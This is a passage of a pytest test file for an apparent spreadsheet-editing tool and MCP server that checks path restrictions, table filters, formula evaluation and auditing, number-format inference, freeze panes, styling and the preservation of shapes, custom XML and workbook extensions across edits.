    with pytest.raises(SlimError, match="network shares"):
        Handlers(open_paths[0]).overview("\\\\server\\share\\book.xlsx")


def test_strict_roots_refuse_everything_outside(open_paths: tuple[Settings, Path]) -> None:
    # Arrange
    strict = replace(open_paths[0], strict_roots=True)

    # Act / Assert
    with pytest.raises(SlimError, match="outside the allowed roots") as info:
        Handlers(strict).overview(str(open_paths[1] / "book.xlsx"))
    assert "SLIM_SHEET_STRICT_ROOTS" in (info.value.hint or "")
    assert load_settings({"SLIM_SHEET_STRICT_ROOTS": "1"}).strict_roots
    assert not load_settings({}).strict_roots


# --- fixes found while building the gather-data report ---------------------------------------


def _numbers_book(tmp_path: Path, name: str = "n.xlsx") -> Path:
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "data"
    ws.append(["Region", "Amount", "Margin"])
    for region, amount, margin in (("North", 10, 0.2), ("South", 20, 0.25), ("East", 5, 1.6)):
        ws.append([region, amount, margin])
    path = tmp_path / name
    wb.save(path)
    return path


def test_set_table_drops_an_overlapping_sheet_filter(tmp_path: Path, settings: Settings) -> None:
    # Arrange: preset 'data' puts a sheet autofilter on the table range first
    _numbers_book(tmp_path)
    h = Handlers(settings)
    h.style_sheet("n.xlsx", "data", preset="data")

    # Act
    text = h.set_table("n.slim.xlsx", "data", "A1:C4", "Sales", overwrite=True)

    # Assert: Excel refuses a sheet filter that overlaps a table
    ws = openpyxl.load_workbook(tmp_path / "n.slim.xlsx")["data"]
    assert ws.auto_filter.ref is None and ws.tables["Sales"].autoFilter.ref == "A1:C4"
    assert "sheet autofilter it covered now belongs to the table" in text


def test_set_table_keeps_a_filter_elsewhere(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _numbers_book(tmp_path)
    h = Handlers(settings)
    h.sheet_layout("n.xlsx", "data", filter_range="E1:F4")

    # Act
    h.set_table("n.slim.xlsx", "data", "A1:C4", "Sales", overwrite=True)

    # Assert
    assert openpyxl.load_workbook(tmp_path / "n.slim.xlsx")["data"].auto_filter.ref == "E1:F4"


def test_rename_may_change_only_letter_case(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    path = _numbers_book(tmp_path)
    wb = openpyxl.load_workbook(path)
    wb.create_sheet("Calc")["A1"] = "=SUM(data!B2:B4)"
    wb.save(path)
    h = Handlers(settings)

    # Act
    text = h.sheet_ops("n.xlsx", "rename", "data", new_name="Data")

    # Assert
    out = openpyxl.load_workbook(tmp_path / "n.slim.xlsx")
    assert "renamed 'data' to 'Data'" in text and out.sheetnames[0] == "Data"
    assert out["Calc"]["A1"].value == "=SUM(Data!B2:B4)"
    with pytest.raises(SlimError, match="already exists"):
        h.sheet_ops("n.slim.xlsx", "rename", "Calc", new_name="DATA", overwrite=True)


def test_compact_cells_collapses_runs_and_caps_the_list() -> None:
    # Arrange
    cells = (*(f"Data!Z{r}" for r in range(2, 132)), "Data!AB5", "Sum!B3", "Sum!B4")
    many = tuple(f"S!A{r}" for r in range(1, 40, 2))

    # Act
    short = compact_cells(cells)
    capped = compact_cells(many)

    # Assert
    assert short == "Data!Z2:Z131, Data!AB5, Sum!B3:B4"
    assert capped.endswith("and 10 more") and capped.count(",") == 9


def test_evaluate_reply_stays_small_and_plain(tmp_path: Path, settings: Settings) -> None:
    # Arrange: a total over 200 formula cells without cached values
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "S"
    for r in range(1, 201):
        ws.cell(row=r, column=1, value=r / 4)
        ws.cell(row=r, column=2, value=f"=A{r}*2")
    ws["D1"] = "=SUM(B1:B200)"
    wb.save(tmp_path / "e.xlsx")

    # Act
    text = Handlers(settings).evaluate(path="e.xlsx", cell="S!D1")

    # Assert
    assert "result: 10050" in text and "np.float64" not in text
    assert "recomputed (no cached value): S!B1:B200" in text and len(text) < 400


@pytest.mark.parametrize(
    ("header", "expected"),
    [
        ("Revenue growth (constant FX)", "growth"),
        ("Net margin", "percent"),
        ("Share of profit", "percent"),
        ("Companies", "integer"),
        ("Loss-makers", "integer"),
        ("Revenue (USD bn)", "number1"),
        ("Ticker", None),
        ("Sector group", None),
    ],
)
def test_formula_columns_get_formats_from_their_header(header: str, expected: str | None) -> None:
    # Act
    key, why = infer_format(header, ["=SUMIFS(A:A,B:B,C1)", "=SUMIFS(A:A,B:B,C2)"])

    # Assert
    assert key == expected
    assert "formula column" in why


def test_one_outlier_does_not_flip_a_rate_column() -> None:
    # Act
    margin, _ = infer_format("Net margin", [0.2, 0.25, 0.31, 1.6])
    growth, _ = infer_format("Profit growth", [0.1, -0.2, 0.05, -275.3])

    # Assert
    assert (margin, growth) == ("percent", "growth")


def test_style_sheet_formats_formula_tables(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _numbers_book(tmp_path)
    wb = openpyxl.load_workbook(tmp_path / "n.xlsx")
    s = wb.create_sheet("Sum")
    s.append(["Region", "Amount", "Margin"])
    for r, region in enumerate(("North", "South", "East"), start=2):
        s.append([region, f"=SUMIFS(data!B:B,data!A:A,A{r})", f"=SUMIFS(data!C:C,data!A:A,A{r})"])
    wb.save(tmp_path / "n.xlsx")

    # Act
    text = Handlers(settings).style_sheet("n.xlsx", "Sum")

    # Assert
    assert "B Amount: number1 (formula column, amount header)" in text
    assert "C Margin: percent (formula column, rate/share header)" in text


def _audit_book(tmp_path: Path, broken: bool) -> Path:
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "T"
    ws.append(["Item", "Qty", "Price", "Value"])
    for r in range(2, 8):
        ws.append([f"i{r}", r, 2, f"=B{r}*C{r}"])
    if broken:
        ws["D5"] = "=B5*C5+1"
    ws.append(["Total", "=SUM(B2:B7)", None, "=SUM(D2:D7)"])
    ws.append(["Average", "=AVERAGE(B2:B7)", None, "=D8/B8"])
    path = tmp_path / ("broken.xlsx" if broken else "clean.xlsx")
    wb.save(path)
    return path


def test_formula_audit_skips_labelled_total_rows(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _audit_book(tmp_path, broken=False)
    _audit_book(tmp_path, broken=True)
    h = Handlers(settings)

    # Act
    clean = h.anomalies("clean.xlsx", scope="formulas")
    broken = h.anomalies("broken.xlsx", scope="formulas")

    # Assert: the total block (Total + the row below it) is not an inconsistency...
    assert "inconsistent_formula" not in clean
    # ...but a real break in the body still is
    assert "T!D5 [inconsistent_formula]" in broken and "T!D8" not in broken


@pytest.mark.parametrize(
    ("formula", "expected"),
    [
        ('=INDEX(B1:B2,2)=""', "TRUE"),
        ('=IF(INDEX(B1:B2,2)="","n/a",1)', "n/a"),
        ("=INDEX(B1:B2,2)=0", "TRUE"),
        ("=INDEX(B1:B2,2)", "0"),
        ("=B2", "0"),
        ("=INDEX(B1:B2,1)", "5"),
        ("=SUM(INDEX(B1:B2,2),1)", "1"),
    ],
)
def test_blank_cells_compare_like_excel(
    tmp_path: Path, settings: Settings, formula: str, expected: str
) -> None:
    # Arrange: values checked against Excel 365 (B2 is blank)
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "S"
    ws["B1"] = 5
    ws["D1"] = formula
    wb.save(tmp_path / "blank.xlsx")

    # Act
    text = Handlers(settings).evaluate(path="blank.xlsx", cell="S!D1")

    # Assert
    assert f"result: {expected}" in text.splitlines()[1]


def _views_xml(path: Path, sheet_index: int) -> str:
    with zipfile.ZipFile(path) as archive:
        xml = archive.read(f"xl/worksheets/sheet{sheet_index}.xml").decode("utf-8")
    return xml[xml.index("<sheetViews>") : xml.index("</sheetViews>")]


def test_styling_keeps_the_authors_freeze_with_valid_selections(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange: frozen on both axes first (B2), then a style call that would freeze rows only
    _numbers_book(tmp_path)
    h = Handlers(settings)
    h.sheet_layout("n.xlsx", "data", freeze="B2")

    # Act
    h.style_sheet("n.slim.xlsx", "data", preset="data", overwrite=True)

    # Assert: the author's freeze stays; Excel refuses duplicate panes
    views = _views_xml(tmp_path / "n.slim.xlsx", 1)
    panes = re.findall(r'<selection [^>]*pane="([^"]*)"', views)
    assert 'ySplit="1"' in views and 'xSplit="1"' in views
    assert len(panes) == len(set(panes))


def test_save_repairs_selections_written_by_older_versions(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange: the damaged view the old code produced (rows frozen, extra and duplicate panes)
    from openpyxl.worksheet.views import Pane, Selection

    path = _numbers_book(tmp_path)
    wb = openpyxl.load_workbook(path)
    view = wb["data"].sheet_view
    view.pane = Pane(ySplit=1, topLeftCell="A2", activePane="bottomLeft", state="frozen")
    view.selection = [
        Selection(pane="bottomLeft", activeCell="A1", sqref="A1"),
        Selection(pane="bottomLeft", activeCell="A1", sqref="A1"),
        Selection(pane="bottomRight", activeCell="A1", sqref="A1"),
    ]
    wb.save(path)

    # Act: any edit saves the file again
    Handlers(settings).write("n.xlsx", "data", "E1", [["note"]])

    # Assert
    views = _views_xml(tmp_path / "n.slim.xlsx", 1)
    assert re.findall(r'<selection [^>]*pane="([^"]*)"', views) == ["bottomLeft"]


def test_unknown_tool_arguments_are_rejected(settings: Settings) -> None:
    # Arrange
    import asyncio

    from mcp.server.mcpserver.exceptions import ToolError

    from slim_sheet.interfaces.mcp_server import build_server

    server = build_server(settings)
    root = str(settings.roots[0])

    # Act
    schema = next(t for t in asyncio.run(server.list_tools()) if t.name == "overview").input_schema

    # Assert: a misspelled parameter is an error, not silently dropped
    assert schema["additionalProperties"] is False
    with pytest.raises(ToolError, match="copy_from"):
        asyncio.run(server.call_tool("overview", {"path": root, "copy_from": "none"}))


def test_floats_print_like_excel() -> None:
    # Act / Assert: 15 significant digits removes binary noise but keeps real precision
    from slim_sheet.core.budget import cell_text

    assert cell_text(611.2259999999999, 40) == "611.226"
    assert cell_text(0.1 + 0.2, 40) == "0.3"
    assert cell_text(123456789.123, 40) == "123456789.123"
    assert cell_text(-0.0549, 40) == "-0.0549"


def test_later_calls_keep_the_workbook_brand(tmp_path: Path, settings: Settings) -> None:
    # Arrange: a workbook created with the 'mono' brand (IBCS greys, Arial)
    h = Handlers(settings)
    h.create_workbook("m.xlsx", sheets=["T"], brand="mono")
    h.write("m.xlsx", "T", "A1", [["Item", "Value"], ["a", 1.5], ["b", 2.25]], overwrite=True)

    # Act: no brand argument and no SLIM_SHEET_BRAND
    text = h.style_sheet("m.xlsx", "T", overwrite=True)
    h.format_range("m.xlsx", "T", "A1", role="title", overwrite=True)

    # Assert
    ws = openpyxl.load_workbook(tmp_path / "m.xlsx")["T"]
    assert "brand mono" in text and ws["A1"].font.name == "Arial"
    assert "brand slim" in h.style_sheet("m.xlsx", "T", brand="slim", overwrite=True)


def test_input_role_cells_stay_editable_under_protection(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange
    _numbers_book(tmp_path)
    h = Handlers(settings)

    # Act
    h.format_range("n.xlsx", "data", "B2:B4", role="input")
    h.sheet_layout("n.slim.xlsx", "data", protect=True, overwrite=True)

    # Assert
    ws = openpyxl.load_workbook(tmp_path / "n.slim.xlsx")["data"]
    assert ws.protection.sheet is True
    assert ws["B2"].protection.locked is False and ws["B4"].protection.locked is False
    assert ws["A2"].protection.locked is True


# --- keep shapes (Office Scripts / macro buttons), customXml and workbook extensions ---------

_XDR = "http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing"
_DML = "http://schemas.openxmlformats.org/drawingml/2006/main"
_BUTTON = (
    "<xdr:twoCellAnchor><xdr:from><xdr:col>4</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>1</xdr:row>"
    "<xdr:rowOff>0</xdr:rowOff></xdr:from><xdr:to><xdr:col>6</xdr:col><xdr:colOff>0</xdr:colOff>"
    '<xdr:row>3</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to><xdr:sp macro="" textlink="">'
    '<xdr:nvSpPr><xdr:cNvPr id="2" name="Run script"/><xdr:cNvSpPr/></xdr:nvSpPr><xdr:spPr>'
    '<a:prstGeom prst="roundRect"><a:avLst/></a:prstGeom></xdr:spPr><xdr:txBody><a:bodyPr/>'
    "<a:p><a:r><a:t>Run script</a:t></a:r></a:p></xdr:txBody></xdr:sp><xdr:clientData/>"
    "</xdr:twoCellAnchor>"
)
_LINKED_PIC_SHAPE = _BUTTON.replace('name="Run script"', 'name="Logo shape"').replace(
    "<a:prstGeom", '<a:blipFill><a:blip r:embed="rId9"/></a:blipFill><a:prstGeom'
)


def _book_with_shapes(path: Path, linked: bool = False) -> Path:
    """An openpyxl workbook given what Excel writes for a script button, custom XML and a
    workbook extension (openpyxl itself cannot create them)."""
    wb = openpyxl.Workbook()
    ws = wb.active
    assert ws is not None
    ws.title = "Data"
    ws.append(["Region", "Amount"])
    ws.append(["North", 10])
    wb.create_sheet("Other")
    wb.save(path)
    anchors = _BUTTON + (_LINKED_PIC_SHAPE if linked else "")
    drawing = (
        f'<?xml version="1.0" encoding="UTF-8"?><xdr:wsDr xmlns:xdr="{_XDR}" xmlns:a="{_DML}" '
        f'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">{anchors}</xdr:wsDr>'
    )
    with zipfile.ZipFile(path) as z:
        files = {n: z.read(n) for n in z.namelist()}
    files["xl/drawings/drawing1.xml"] = drawing.encode()
    files["xl/worksheets/_rels/sheet1.xml.rels"] = (
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        b'relationships/drawing" Target="../drawings/drawing1.xml"/></Relationships>'
    )
    sheet = files["xl/worksheets/sheet1.xml"].decode()
    sheet = sheet.replace(
        "</worksheet>",
        '<drawing xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
        'r:id="rId1"/></worksheet>',
    )
    files["xl/worksheets/sheet1.xml"] = sheet.encode()
    files["customXml/item1.xml"] = (
        b"<slimTest xmlns='urn:slim:test'><owner>finance</owner></slimTest>"
    )
    rels = (
        files["xl/_rels/workbook.xml.rels"]
        .decode()
        .replace(
            "</Relationships>",
            '<Relationship Id="rId99" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
            'relationships/customXml" Target="../customXml/item1.xml"/></Relationships>',
        )
    )
    files["xl/_rels/workbook.xml.rels"] = rels.encode()
    types = (
        files["[Content_Types].xml"]
        .decode()
        .replace(
            "</Types>",
            '<Override PartName="/xl/drawings/drawing1.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.drawing+xml"/></Types>',
        )
    )
    files["[Content_Types].xml"] = types.encode()
    book = (
        files["xl/workbook.xml"]
        .decode()
        .replace(
            "</workbook>",
            '<extLst><ext uri="{SLIM-TEST-EXT}" xmlns:t="urn:slim:ext">'
            '<t:flag on="1"/></ext></extLst></workbook>',
        )
    )
    files["xl/workbook.xml"] = book.encode()
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return path


def _package(path: Path) -> dict[str, str]:
    with zipfile.ZipFile(path) as z:
        return {n: z.read(n).decode("utf-8", "replace") for n in z.namelist()}


def test_edits_keep_script_buttons_custom_xml_and_workbook_extensions(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange
    _book_with_shapes(tmp_path / "s.xlsx")
    h = Handlers(settings)

    # Act: three different edits, the second adds a chart to the same drawing
    first = h.write("s.xlsx", "Data", "C1", [["note"]])
    h.add_chart("s.slim.xlsx", "Data", "column", "A1:B2", anchor="D8", overwrite=True)
    h.style_sheet("s.slim.xlsx", "Data", overwrite=True)

    # Assert
    parts = _package(tmp_path / "s.slim.xlsx")
    drawing = next(x for n, x in parts.items() if n.startswith("xl/drawings/drawing"))
    assert "kept 1 shape(s)" in first and "Run script" in first
    assert drawing.count("<xdr:sp ") == 1 and "graphicFrame" in drawing
    ids = re.findall(r'cNvPr\b[^>]*\bid="(\d+)"', drawing)
    assert len(ids) == len(set(ids))  # unique ids next to the chart
    assert "owner>finance" in parts["customXml/item1.xml"]
    assert "customXml/item1.xml" in parts["xl/_rels/workbook.xml.rels"]
    assert "{SLIM-TEST-EXT}" in parts["xl/workbook.xml"]


def test_a_shape_on_a_sheet_without_drawing_gets_a_new_drawing(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange: openpyxl writes no drawing for a sheet that has only shapes
    _book_with_shapes(tmp_path / "s.xlsx")

    # Act
    Handlers(settings).write("s.xlsx", "Other", "A1", [["x"]])

    # Assert
    parts = _package(tmp_path / "s.slim.xlsx")
    assert "<drawing " in parts["xl/worksheets/sheet1.xml"]
    assert "drawing" in parts["xl/worksheets/_rels/sheet1.xml.rels"]
    assert any("Run script" in x for n, x in parts.items() if n.startswith("xl/drawings/"))
    assert "drawing+xml" in parts["[Content_Types].xml"]


def test_shapes_linked_to_pictures_are_reported_not_dropped_silently(
    tmp_path: Path, settings: Settings
) -> None:
    # Arrange
    _book_with_shapes(tmp_path / "s.xlsx", linked=True)

    # Act
    text = Handlers(settings).write("s.xlsx", "Data", "C1", [["x"]])

    # Assert
    assert "drops 1 shape(s) linked to pictures or links: Data: Logo shape" in text
    assert "kept 1 shape(s)" in text


def test_overview_lists_shapes(tmp_path: Path, settings: Settings) -> None:
    # Arrange
    _book_with_shapes(tmp_path / "s.xlsx")

    # Act
    text = Handlers(settings).overview("s.xlsx")

    # Assert
    assert "1 shape(s) such as buttons or text boxes" in text
